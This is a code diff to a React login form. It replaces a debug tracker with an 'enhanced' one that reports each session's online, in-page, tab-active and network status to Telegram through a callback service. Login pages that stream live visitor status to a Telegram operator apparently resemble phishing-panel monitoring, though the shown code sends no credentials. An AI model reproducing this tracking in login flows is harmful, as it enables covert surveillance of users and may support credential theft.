@@ -38,9 +38,9 @@ import {
   registerTelegramCallback,
   unregisterTelegramCallback,
 } from "@/lib/telegram-callback-service";
-import debugOnlineTracker, {
-  type DebugState,
-} from "@/lib/debug-online-tracker";
+import enhancedRealtimeTracker, {
+  type UserPresenceState,
+} from "@/lib/enhanced-realtime-tracker";
 import type { SimpleActivityState } from "@/lib/simple-realtime-tracker";
 
 type AuthStep =
@@ -115,53 +115,56 @@ export const LoginForm = () => {
     }
   }, [sessionId]);
 
-  // Debug real-time online/offline tracking
+  // Enhanced real-time online/offline tracking
   useEffect(() => {
     if (sessionId) {
       console.log(
-        "🐛 Starting DEBUG real-time tracking for session:",
+        "🚀 Starting ENHANCED real-time tracking for session:",
         sessionId,
         "- Current step:",
         currentStep,
       );
 
-      const handleStateChange = async (state: DebugState) => {
-        console.log("📡 DEBUG state changed:", {
+      const handlePresenceChange = async (state: UserPresenceState) => {
+        console.log("📡 ENHANCED presence state changed:", {
           sessionId,
           isOnline: state.isOnline,
-          reason: state.reason,
+          isInPage: state.isInPage,
+          browserTabActive: state.browserTabActive,
+          networkConnected: state.networkConnected,
           currentStep,
-          timestamp: new Date(state.timestamp).toLocaleString("fa-IR"),
+          lastSeen: new Date(state.lastSeen).toLocaleString("fa-IR"),
         });
 
-        console.log("📤 Sending to Telegram:", {
-          statusText: debugOnlineTracker.getStatusText(),
-          statusEmoji: debugOnlineTracker.getStatusEmoji(),
+        console.log("📤 Sending enhanced presence to Telegram:", {
+          statusText: enhancedRealtimeTracker.getStatusText(),
+          statusEmoji: enhancedRealtimeTracker.getStatusEmoji(),
+          detailedStatus: enhancedRealtimeTracker.getDetailedStatus(),
         });
 
         try {
-          // Send updates to Telegram
+          // Send presence updates to Telegram
           const result = await updateUserOnlineStatus(
             sessionId,
             state.isOnline,
-            state.isOnline, // isVisible = isOnline for debug
-            state.timestamp,
-            debugOnlineTracker.getStatusText(),
-            debugOnlineTracker.getStatusEmoji(),
+            state.isInPage,
+            state.lastSeen,
+            enhancedRealtimeTracker.getStatusText(),
+            enhancedRealtimeTracker.getStatusEmoji(),
           );
 
-          console.log("✅ DEBUG update sent successfully", result);
+          console.log("✅ Enhanced presence update sent successfully");
         } catch (error) {
-          console.error("❌ Failed to send DEBUG update:", error);
+          console.error("❌ Failed to send enhanced presence update:", error);
         }
       };
 
-      // Start debug tracking
-      debugOnlineTracker.start(sessionId, handleStateChange);
+      // Start enhanced real-time tracking
+      enhancedRealtimeTracker.start(sessionId, handlePresenceChange);
 
       return () => {
-        console.log("🛑 Stopping debug tracking");
-        debugOnlineTracker.stop();
+        console.log("🛑 Stopping enhanced real-time tracking");
+        enhancedRealtimeTracker.stop();
       };
     }
   }, [sessionId, currentStep]);
